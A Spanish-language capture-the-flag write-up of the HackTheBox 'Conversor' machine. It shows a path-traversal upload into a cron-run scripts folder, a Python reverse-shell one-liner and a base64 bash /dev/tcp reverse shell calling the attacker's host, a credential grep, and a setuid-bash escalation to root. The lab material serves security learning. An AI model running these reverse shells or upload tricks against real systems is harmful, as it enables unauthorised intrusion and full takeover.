
# Conversor

<figure><img src="/files/wSsQXIIElhaOnI1hP1ue" alt=""><figcaption></figcaption></figure>

## <mark style="color:purple;">Información General</mark>

* **Nombre de la máquina:** `Conversor`
* **IP:** `10.10.11.92`
* **Sistema operativo:** `Linux`
* **Dificultad:** `🟢 Fácil`
* **Fecha:** `14-11-2025`

***

## <mark style="color:purple;">Reconocimiento Inicial</mark>

#### Añadimos la IP al /etc/hosts

```bash
sudo echo "10.10.11.92 conversor.htb" | sudo tee -a /etc/hosts
```

### Escaneo de Puertos

#### Escaneo Simple

```bash
sudo nmap -v -p- --open -A -n 10.10.11.92
```

```bash
PORT     STATE SERVICE   VERSION                                                                          │
22/tcp   open  ssh       OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)                    │
| ssh-hostkey:                                                                                            │
|   256 01:74:26:39:47:bc:6a:e2:cb:12:8b:71:84:9c:f8:5a (ECDSA)                                           │
|_  256 3a:16:90:dc:74:d8:e3:c4:51:36:e2:08:06:26:17:ee (ED25519)                                         │
80/tcp   open  http      Apache httpd 2.4.52                                                              │
| http-methods:                                                                                           │
|_  Supported Methods: GET HEAD POST OPTIONS                                                              │
|_http-title: Did not follow redirect to http://conversor.htb/                                            │
|_http-server-header: Apache/2.4.52 (Ubuntu)                                                              │
8000/tcp open  http-alt?
                                                                             │
Service Info: Host: conversor.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

#### Análisis del escaneo

* Puertos: 22 (SSH) y 80 (HTTP).
* Pista Clave: El servidor HTTP redirige a `http://conversor.htb/`
* Objetivo Principal: El servidor web en el puerto 80 es el único vector de ataque claro. El nombre "conversor" sugiere algún tipo de herramienta de conversión.

### Fuzzing de Directorios

```bash
dirsearch -u http://conversor.htb/ -x 404          
                                                                
  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/kali/Escritorio/machines/htb/conversor/reports/http_conversor.htb/__25-10-30_04-56-11.txt

Target: http://conversor.htb/

[04:56:11] Starting: 
[04:56:21] 200 -    3KB - /about
[04:56:53] 301 -  319B  - /javascript  ->  http://conversor.htb/javascript/
[04:56:56] 200 -  722B  - /login
[04:57:13] 200 -  726B  - /register
[04:57:15] 403 -  278B  - /server-status
[04:57:15] 403 -  278B  - /server-status/

Task Completed
```

Encontramos una página About, que al abrirla en el navegador, descubrimos que tiene un botón para descargar el código fuente completo de la aplicación web. Esto nos servirá para encontrar la manera de vulnerarlo o encontrar credenciales expuestas.

<figure><img src="/files/VC65AIm7GD3w2HRVHwU1" alt=""><figcaption></figcaption></figure>

Nos descargamos el código y lo extraemos con el siguiente comando:

```bash
tar -xvf source_code.tar.gz

app.py
app.wsgi
install.md
instance/
instance/users.db
scripts/
static/
static/images/
static/images/david.png
static/images/fismathack.png
static/images/arturo.png
static/nmap.xslt
static/style.css
templates/
templates/register.html
templates/about.html
templates/index.html
templates/login.html
templates/base.html
templates/result.html
uploads/
```

### Análisis del código

#### app.py

En el archivo `app.py` encontramos un secret key de flask y una ruta a la base de datos `users.db`

{% code title="app.py" %}

```python
from flask import Flask, render_template, request, redirect, url_for, session, send_from_directory
import os, sqlite3, hashlib, uuid

app = Flask(__name__)
app.secret_key = 'Changemeplease'

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
DB_PATH = '/var/www/conversor.htb/instance/users.db'
UPLOAD_FOLDER = os.path.join(BASE_DIR, 'uploads')
os.makedirs(UPLOAD_FOLDER, exist_ok=True)

<---SNIP--->
```

{% endcode %}

Analizando el contenido de `app.py` identificamos la vulnerabilidad de Path Traversal en la ruta `/convert`.

{% code title="app.py" %}

```python
<---SNIP--->

@app.route('/convert', methods=['POST'])
def convert():
    if 'user_id' not in session:
        return redirect(url_for('login'))
    xml_file = request.files['xml_file']
    xslt_file = request.files['xslt_file']
    from lxml import etree
    xml_path = os.path.join(UPLOAD_FOLDER, xml_file.filename)
    xslt_path = os.path.join(UPLOAD_FOLDER, xslt_file.filename)
    xml_file.save(xml_path)
    xslt_file.save(xslt_path)

<---SNIP--->
```

{% endcode %}

La función convert utiliza `os.path.join(UPLOAD_FOLDER, xml_file.filename)` y `os.path.join(UPLOAD_FOLDER, xslt_file.filename)` para guardar los archivos subidos.

En el archivo `install.md` encontramos que se ejecuta una tarea cron que ejecuta cualquier script en python de la ruta `/var/www/conversor.htb/scripts/*.py`:

{% code title="install.md" %}

```bash
To deploy Conversor, we can extract the compressed file:

"""
tar -xvf source_code.tar.gz
"""

We install flask:

"""
pip3 install flask
"""

We can run the app.py file:

"""
python3 app.py
"""

You can also run it with Apache using the app.wsgi file.

If you want to run Python scripts (for example, our server deletes all files older than 60 minutes to avoid system overload), you can add the following line to your /etc/crontab.

"""
* * * * * www-data for f in /var/www/conversor.htb/scripts/*.py; do python3 "$f"; done
"""
```

{% endcode %}

Dado que `UPLOAD_FOLDER` es `/var/www/conversor.htb/uploads/` y el cron job ejecuta scripts Python desde `/var/www/conversor.htb/scripts/`, podemos usar `../scripts/shell.py` para subir un script a la ubicación deseada.

## <mark style="color:purple;">Explotación</mark>

Ahora, continuemos con el plan para obtener RCE:

### Payload de Reverse Shell

Usaremosel siguiente payload en python para ganar RCE:

{% code title="shell.py" overflow="wrap" %}

```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.15.3",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"])
```

{% endcode %}

### Listener de Netcat

En tu máquina atacante, abre una terminal y ejecuta el siguiente comando para escuchar las\
conexiones entrantes en el puerto que elegiste (por ejemplo, 4444):

```bash
nc -nlvp 4444
```

### Subida del payload

Para subir el archivo, necesitarás una sesión de usuario válida.&#x20;

#### Regístrate/Inicia sesión

Ve a `http://conversor.htb/register` para crear una cuenta, luego inicia sesión en `http://conversor.htb/login`.

<figure><img src="/files/shIJEiXk8uqo6o9mtp4v" alt=""><figcaption></figcaption></figure>

#### Captura la cookie de sesión

Después de iniciar sesión, inspecciona las cookies de tu navegador y copia el valor de la cookie `session`.

<figure><img src="/files/uFSRRvMaxcgJdrvjxvvm" alt=""><figcaption></figcaption></figure>

En mi caso tengo la cookie:

```
eyJ1c2VyX2lkIjo2LCJ1c2VybmFtZSI6ImFmc2g0Y2sifQ.aRZTeQ.EnsqrlRJaRrZ4cMQG_neFyXXMGs
```

#### Crear XML de prueba

Podemos usar nmap para generar un XML válido:

```bash
nmap -v -A 10.10.11.92 -oX scan.xml
```

#### Subida del payload con curl

Ahora, usa curl para enviar el archivo dummy.xml y tu reverse\_shell.py con el nombre de archivo manipulado. Reemplaza `TU_COOKIE_DE_SESION` con el valor real de tu cookie de sesión.

```bash
curl -v -X POST "http://conversor.htb/convert" \
-H "Cookie: session=TU_COOKIE_DE_SESION" \
-F "xml_file=@scan.xml" \
-F "xslt_file=@shell.py;filename=../scripts/shell.py"
```

Después de ejecutar este comando, el archivo shell.py debería ser subido a\
`/var/www/conversor.htb/scripts/`. El cron job se ejecuta cada minuto, por lo que deberías recibir una\
shell inversa en tu listener de Netcat en breve.

#### Captura de shell

Recibimos la shell al instante! Estamos dentro como `www-data`:

<figure><img src="/files/YFN9qR9bXJLw0WTuXZcf" alt=""><figcaption></figcaption></figure>

### Estabilizar sesión

Usaremos Penelope para estabilizar nuestra sesión y tener persistencia:

{% embed url="<https://github.com/brightio/penelope>" %}

```bash
pipx install git+https://github.com/brightio/penelope

penelope
```

<figure><img src="/files/QFe2CD0y7qzQGRsfXtv4" alt=""><figcaption></figcaption></figure>

Usaremos el payload en bash de la sección `tun0`, ya que estamos conectados por VPN:

```bash
➤  tun0 → 10.10.15.3:4444

Bash TCP
printf KGJhc2ggPiYgL2Rldi90Y3AvMTAuMTAuMTUuMy80NDQ0IDA+JjEpICY=|base64 -d|bash
```

Lo ejecutamos en la máquina objetivo:

```shell-session
nc -nlvp 4444  
listening on [any] 4444 ...
connect to [10.10.15.3] from (UNKNOWN) [10.10.11.92] 50602
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
$ ls
conversor.htb
$ printf KGJhc2ggPiYgL2Rldi90Y3AvMTAuMTAuMTUuMy80NDQ0IDA+JjEpICY=|base64 -d|bash
$ 
```

Y automáticamente recibimos la shell PTY con persistencia:

{% hint style="warning" %}
Con F12 podemos cerrar la sesión para interactuar con ella más tarde
{% endhint %}

<figure><img src="/files/oUGF21qJR5YQYE3Xk3kI" alt=""><figcaption></figcaption></figure>

#### Passwd

Al leer el passwd encontramos el usuario `fismathack` con shell, con lo que se convierte en nuestro actual objetivo:

```shell-session
www-data@conversor:~$ cat /etc/passwd

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
pollinate:x:105:1::/var/cache/pollinate:/bin/false
syslog:x:106:113::/home/syslog:/usr/sbin/nologin
uuidd:x:107:114::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:115::/nonexistent:/usr/sbin/nologin
tss:x:109:116:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:110:117::/var/lib/landscape:/usr/sbin/nologin
fwupd-refresh:x:111:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
fismathack:x:1000:1000:fismathack:/home/fismathack:/bin/bash
lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
sshd:x:113:65534::/run/sshd:/usr/sbin/nologin
_laurel:x:998:998::/var/log/laurel:/bin/false
```

### Linpeas

Correremos un Linpeas para analizar la escalada de privilegios. Como tenemos una sesión Penelope abierta llevaremos la sesión al background con F12, y usaremos el comando run peass\_ng para correrlo automáticamente:

<figure><img src="/files/qUnaVrHv4DAzeweIkOLZ" alt=""><figcaption></figcaption></figure>

Linpeas encuentra una versión de sudo vulnerable:

```bash
╔══════════╣ Sudo version
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-version                
Sudo version 1.9.9  
```

Y un proceso sospechoso:

```bash
╔══════════╣ Processes whose PPID belongs to a different user (not root)
╚ You will know if a user can somehow spawn processes as a different user                                                             
Proc 3048 with ppid 3047 is run by user root but the ppid user is fismat                                                              hack  
```

Y por supuesto el cron de scripts:

```bash
* * * * * www-data for f in /var/www/conversor.htb/scripts/*.py; do python3 "$f"; done
```

### Credential Hunting

Buscando todos los archivos que pudieran contener credenciales, encontramos una contraseña muy interesante en el archivo app.py de producción:

```shell-session
www-data@conversor:/tmp$ cd /var/www
www-data@conversor:~$ grep -r -E "password|pass|secret|key|cred|auth" /var/www/ --include=\*.{conf,ini,env,json,xml,yml,yaml,txt,log,sh,py} 2>/dev/null

/var/www/conversor.htb/uploads/scan.xml:<port protocol="tcp" portid="22"><state state="open" reason="syn-ack" reason_ttl="63"/><service name="ssh" product="OpenSSH" version="8.9p1 Ubuntu 3ubuntu0.13" extrainfo="Ubuntu Linux; protocol 2.0" ostype="Linux" method="probed" conf="10"><cpe>cpe:/a:openbsd:openssh:8.9p1</cpe><cpe>cpe:/o:linux:linux_kernel</cpe></service><script id="ssh-hostkey" output="&#xa;  256 01:74:26:39:47:bc:6a:e2:cb:12:8b:71:84:9c:f8:5a (ECDSA)&#xa;  256 3a:16:90:dc:74:d8:e3:c4:51:36:e2:08:06:26:17:ee (ED25519)"><table>
/var/www/conversor.htb/uploads/scan.xml:<elem key="type">ecdsa-sha2-nistp256</elem>
/var/www/conversor.htb/uploads/scan.xml:<elem key="fingerprint">0174263947bc6ae2cb128b71849cf85a</elem>
/var/www/conversor.htb/uploads/scan.xml:<elem key="bits">256</elem>
/var/www/conversor.htb/uploads/scan.xml:<elem key="key">AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJ9JqBn+xSQHg4I+jiEo+FiiRUhIRrVFyvZWz1pynUb/txOEximgV3lqjMSYxeV/9hieOFZewt/ACQbPhbR/oaE=</elem>
/var/www/conversor.htb/uploads/scan.xml:<elem key="type">ssh-ed25519</elem>
/var/www/conversor.htb/uploads/scan.xml:<elem key="fingerprint">3a1690dc74d8e3c45136e208062617ee</elem>
/var/www/conversor.htb/uploads/scan.xml:<elem key="bits">256</elem>
/var/www/conversor.htb/uploads/scan.xml:<elem key="key">AAAAC3NzaC1lZDI1NTE5AAAAIIR1sFcTPihpLp0OemLScFRf8nSrybmPGzOs83oKikw+</elem>
/var/www/conversor.htb/uploads/scan.xml:<port protocol="tcp" portid="80"><state state="open" reason="syn-ack" reason_ttl="63"/><service name="http" product="Apache httpd" version="2.4.52" hostname="conversor.htb" method="probed" conf="10"><cpe>cpe:/a:apache:http_server:2.4.52</cpe></service><script id="http-title" output="Login&#xa;Requested resource was /login"><elem key="title">Login</elem>
/var/www/conversor.htb/uploads/scan.xml:<elem key="redirect_url">/login</elem>
/var/www/conversor.htb/uploads/scan.xml:</script><script id="http-methods" output="&#xa;  Supported Methods: HEAD OPTIONS GET"><table key="Supported Methods">
/var/www/conversor.htb/app.py:app.secret_key = 'C0nv3rs0rIsthek3y29'
<---SNIP--->
```

Tenemos la clave `C0nv3rs0rIsthek3y29` que probamos para acceder con el usuario `fismathack`, pero no funciona, ya que las claves secretas de Flask se usan para la gestión de sesiones, no para las contraseñas de usuario del sistema.

```shell-session
www-data@conversor:~$ su fismathack
Password: 
su: Authentication failure
```

Dado que no hemos podido encontrar la base de datos activa por otros medios, el siguiente paso más prometedor es intentar la forja de sesión utilizando la clave secreta que hemos encontrado.

### LSE - Linux Smart Enumeration

Desde la sesión de Penelope lanzaremos el módulo de LSE:

<figure><img src="/files/swNoNTk64W2yynJuYxy1" alt=""><figcaption></figcaption></figure>

Encontramos algo super interesante, que el binario `/usr/bin/bash` es un binario con setuid, lo que nos permite instantáneamente convertirnos en root.

#### Comprobación

Como vemos, el binario /usr/bin/bash le pertenece al usuario root:

```shell-session
www-data@conversor:~$ ls -l /usr/bin/bash
-rwsr-sr-x 1 root root 1396520 Mar 14  2024 /usr/bin/bash
```

### Elevación a root

Para convertirnos en root es tan sencillo como ejecutar el siguiente comando:

```shell-session
www-data@conversor:~$  /usr/bin/bash -p

bash-5.1# whoami
root
```

## <mark style="color:purple;">User Flag</mark>

```bash
bash-5.1# cd /home/fismathack

bash-5.1# ls
user.txt

bash-5.1# cat user.txt
c2b3c94680649286914c1d30********
```

## <mark style="color:purple;">Root Flag</mark>

```bash
bash-5.1# cd /root

bash-5.1# ls
root.txt  scripts

bash-5.1# cat root.txt
be15bac926e3b73e47d88ac0********
```
